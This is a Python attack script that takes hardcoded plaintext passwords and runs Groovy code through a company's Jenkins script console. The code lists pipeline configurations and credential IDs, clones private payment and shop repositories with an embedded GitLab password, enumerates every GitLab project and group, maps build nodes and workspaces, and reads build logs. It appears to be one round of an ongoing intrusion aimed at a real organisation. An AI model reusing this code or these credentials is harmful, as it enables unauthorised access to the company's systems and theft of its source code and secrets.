import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script, label=""):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(
        BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']}
    )
    result = opener.open(req2, timeout=240).read().decode()
    if label:
        print(f"\n{'='*60}\n[TASK] {label}\n{'='*60}")
        print(result)
    return result

# ── TASK 1: Get Jenkinsfile content from caja-api (CpsFlowDefinition = inline)
script1 = (
    'import jenkins.model.Jenkins\n'
    'import org.jenkinsci.plugins.workflow.job.WorkflowJob\n'
    'import org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition\n'
    'import org.jenkinsci.plugins.workflow.cps.CpsScmFlowDefinition\n'
    '\n'
    'def jenkins = Jenkins.instance\n'
    'def targets = ["cs_legacy_front/cs_legacy_pipe_build_caja-api", "cs_legacy_front/cs_legacy_pipe_build_caja-front"]\n'
    'targets.each { name ->\n'
    '    def job = jenkins.getItemByFullName(name)\n'
    '    if (!job) { println "NOT FOUND: ${name}"; return }\n'
    '    println "\\n=== JOB: ${name} ==="\n'
    '    def def_ = job.definition\n'
    '    println "TYPE: ${def_?.class?.simpleName}"\n'
    '    if (def_ instanceof CpsFlowDefinition) {\n'
    '        println "JENKINSFILE:\\n${def_.script?.take(3000)}"\n'
    '    } else if (def_ instanceof CpsScmFlowDefinition) {\n'
    '        def scm = def_.scm\n'
    '        println "SCM: ${scm?.class?.simpleName}"\n'
    '        if (scm?.respondsTo("getUserRemoteConfigs")) {\n'
    '            scm.userRemoteConfigs.each { r -> println "URL: ${r.url} CRED: ${r.credentialsId}" }\n'
    '        }\n'
    '        println "SCRIPT_PATH: ${def_.scriptPath}"\n'
    '    }\n'
    '}\n'
)
jenkins_exec(script1, "JENKINSFILE CONTENT OF CAJA-API")
time.sleep(1)

# ── TASK 2: Get CpsScmFlowDefinition SCM URL for claropay + t1pagos
script2 = (
    'import jenkins.model.Jenkins\n'
    'import org.jenkinsci.plugins.workflow.cps.CpsScmFlowDefinition\n'
    '\n'
    'def jenkins = Jenkins.instance\n'
    'def targets = [\n'
    '    "cs_new_front/cs_new_pipe_build_claropay-api",\n'
    '    "cs_new_front/cs_new_pipe_build_t1pagos-api",\n'
    '    "sn_new_front/sn_new_pipe_build_t1pagos-api"\n'
    ']\n'
    'targets.each { name ->\n'
    '    def job = jenkins.getItemByFullName(name)\n'
    '    if (!job) { println "NOT FOUND: ${name}"; return }\n'
    '    println "\\n=== JOB: ${name} ==="\n'
    '    def def_ = job.definition\n'
    '    if (def_ instanceof CpsScmFlowDefinition) {\n'
    '        def scm = def_.scm\n'
    '        if (scm?.respondsTo("getUserRemoteConfigs")) {\n'
    '            scm.userRemoteConfigs.each { r -> println "URL: ${r.url} | CRED: ${r.credentialsId}" }\n'
    '        }\n'
    '        if (scm?.respondsTo("getBranches")) {\n'
    '            scm.branches?.each { b -> println "BRANCH: ${b.name}" }\n'
    '        }\n'
    '        println "SCRIPT_PATH: ${def_.scriptPath}"\n'
    '    }\n'
    '}\n'
)
jenkins_exec(script2, "CLAROPAY + T1PAGOS SCM URLS")
time.sleep(1)

# ── TASK 3: Try git clone with URL-encoded password ($=%24) ────
script3 = (
    '// $ in URL must be %24\n'
    'def GITPASS = "e6LBqIkOI%24PR1XX2oia"\n'
    'def GITBASE = "http://jenkins:" + GITPASS + "@gitlab.dev.claroshop.com"\n'
    'def repos = ["claroshop/caja-api", "claroshop/caja-pagos-api", "claroshop/claropay-api", "claroshop/axii-claroshop", "claroshop/tienda", "claroshop/t1-admin-api"]\n'
    'repos.each { repo ->\n'
    '    def outDir = "/tmp/p_" + repo.replace("/","_")\n'
    '    def url = GITBASE + "/" + repo + ".git"\n'
    '    def proc = ["git","clone","--depth=1",url,outDir].execute()\n'
    '    proc.waitForOrKill(30000)\n'
    '    def out = proc.text + proc.err.text\n'
    '    println "CLONE ${repo}: ${out.take(200)}"\n'
    '    if (new File(outDir).exists()) {\n'
    '        def ls = ["bash","-c","ls ${outDir}"].execute().text\n'
    '        println "  LS: ${ls.take(200)}"\n'
    '    }\n'
    '}\n'
)
jenkins_exec(script3, "GIT CLONE WITH URL-ENCODED PASSWORD")
time.sleep(2)

# ── TASK 4: Get GitLab projects pagination (there ARE public projects)
script4 = (
    'def base = "https://gitlab.dev.claroshop.com"\n'
    'def user = "jenkins"; def pass_ = "e6LBqIkOI\\$PR1XX2oia"\n'
    'def enc = (user+":"+pass_).bytes.encodeBase64().toString()\n'
    '\n'
    '// Paginate ALL public projects\n'
    'for (int page = 1; page <= 5; page++) {\n'
    '    try {\n'
    '        def url = new URL(base+"/api/v4/projects?per_page=100&page="+page+"&order_by=id")\n'
    '        def conn = url.openConnection()\n'
    '        conn.connectTimeout=10000; conn.readTimeout=15000\n'
    '        conn.setRequestProperty("Authorization","Basic "+enc)\n'
    '        def code = conn.responseCode\n'
    '        def body = code<400 ? conn.inputStream.text : conn.errorStream?.text?:""\n'
    '        def totalPages = conn.getHeaderField("X-Total-Pages")\n'
    '        def total = conn.getHeaderField("X-Total")\n'
    '        println "PAGE=${page} CODE=${code} TOTAL=${total} TOTAL_PAGES=${totalPages}"\n'
    '        // Extract project names\n'
    '        def matcher = body =~ /"path_with_namespace":"([^"]+)"/\n'
    '        matcher.each { m -> println "  REPO: ${m[1]}" }\n'
    '        if (!body.startsWith("[") || body == "[]") break\n'
    '    } catch(e) { println "PAGE ${page} FAIL: ${e.message?.take(80)}"; break }\n'
    '}\n'
)
jenkins_exec(script4, "PAGINATE ALL GITLAB PROJECTS")
time.sleep(1)

# ── TASK 5: Try gitlab groups to find claroshop group id + projects
script5 = (
    'def base = "https://gitlab.dev.claroshop.com"\n'
    'def user = "jenkins"; def pass_ = "e6LBqIkOI\\$PR1XX2oia"\n'
    'def enc = (user+":"+pass_).bytes.encodeBase64().toString()\n'
    '\n'
    '// List all groups\n'
    'try {\n'
    '    def url = new URL(base+"/api/v4/groups?per_page=100&all_available=true")\n'
    '    def conn = url.openConnection()\n'
    '    conn.connectTimeout=10000; conn.readTimeout=15000\n'
    '    conn.setRequestProperty("Authorization","Basic "+enc)\n'
    '    def code = conn.responseCode\n'
    '    def body = code<400 ? conn.inputStream.text : conn.errorStream?.text?:""\n'
    '    println "GROUPS [${code}]: ${body.take(2000)}"\n'
    '} catch(e) { println "GROUPS FAIL: ${e.message}" }\n'
    '\n'
    '// Try group claroshop directly\n'
    'def groupNames = ["claroshop","cs","claro","shop","legacy","sears","sanborns"]\n'
    'groupNames.each { g ->\n'
    '    try {\n'
    '        def url = new URL(base+"/api/v4/groups/"+g+"/projects?per_page=50&simple=true")\n'
    '        def conn = url.openConnection()\n'
    '        conn.connectTimeout=8000; conn.readTimeout=10000\n'
    '        conn.setRequestProperty("Authorization","Basic "+enc)\n'
    '        def code = conn.responseCode\n'
    '        def body = code<400 ? conn.inputStream.text : conn.errorStream?.text?:""\n'
    '        println "GROUP ${g} [${code}]: ${body.take(500)}"\n'
    '    } catch(e) { println "GROUP ${g} FAIL: ${e.message?.take(60)}" }\n'
    '}\n'
)
jenkins_exec(script5, "GITLAB GROUPS + CLAROSHOP GROUP PROJECTS")
time.sleep(1)

# ── TASK 6: Check build agent slaves for workspaces ────────────
script6 = (
    'import jenkins.model.Jenkins\n'
    'import hudson.model.Node\n'
    '\n'
    'def jenkins = Jenkins.instance\n'
    'println "=== JENKINS NODES ==="\n'
    'jenkins.nodes.each { node ->\n'
    '    println "NODE: ${node.displayName} | ${node.class.simpleName}"\n'
    '    try {\n'
    '        def channel = node.channel\n'
    '        if (channel) {\n'
    '            def wsRoot = node.rootPath\n'
    '            println "  ROOT: ${wsRoot}"\n'
    '        }\n'
    '    } catch(e) { println "  ERR: ${e.message?.take(60)}" }\n'
    '}\n'
    '\n'
    '// Find workspace on any node for caja-api\n'
    'println "\\n=== WORKSPACES FOR CAJA-API ==="\n'
    'def cajaJob = jenkins.getItemByFullName("cs_legacy_front/cs_legacy_pipe_build_caja-api")\n'
    'if (cajaJob) {\n'
    '    jenkins.nodes.each { node ->\n'
    '        try {\n'
    '            def ws = node.getWorkspaceFor(cajaJob)\n'
    '            if (ws) println "  NODE ${node.displayName} WS: ${ws}"\n'
    '        } catch(e) {}\n'
    '    }\n'
    '    // Also check master\n'
    '    try {\n'
    '        def ws = jenkins.getWorkspaceFor(cajaJob)\n'
    '        if (ws) println "  MASTER WS: ${ws}"\n'
    '    } catch(e) {}\n'
    '}\n'
)
jenkins_exec(script6, "JENKINS NODES + WORKSPACE PATHS")
time.sleep(1)

# ── TASK 7: Read a recent build log to find git repo URL ───────
script7 = (
    'import jenkins.model.Jenkins\n'
    '\n'
    'def job = Jenkins.instance.getItemByFullName("cs_legacy_front/cs_legacy_pipe_build_caja-api")\n'
    'if (job) {\n'
    '    def lastBuild = job.lastBuild\n'
    '    if (lastBuild) {\n'
    '        println "LAST BUILD: #${lastBuild.number}"\n'
    '        def log = lastBuild.logText.readAll().text\n'
    '        // Extract git info from log\n'
    '        def lines = log.split("\\n")\n'
    '        def gitLines = lines.findAll { it.contains("git") || it.contains("Cloning") || it.contains("Fetching") || it.contains("gitlab") || it.contains("checkout") || it.contains("SCM") }\n'
    '        println "GIT LINES FROM LOG:"\n'
    '        gitLines.take(20).each { println "  ${it}" }\n'
    '        \n'
    '        // Print first 50 lines\n'
    '        println "\\nFIRST 50 LOG LINES:"\n'
    '        lines.take(50).each { println it }\n'
    '    }\n'
    '} else {\n'
    '    println "JOB NOT FOUND"\n'
    '}\n'
)
jenkins_exec(script7, "BUILD LOG - FIND GIT REPO URL")
time.sleep(1)

print("\n\n[DONE] Round 4 complete.")
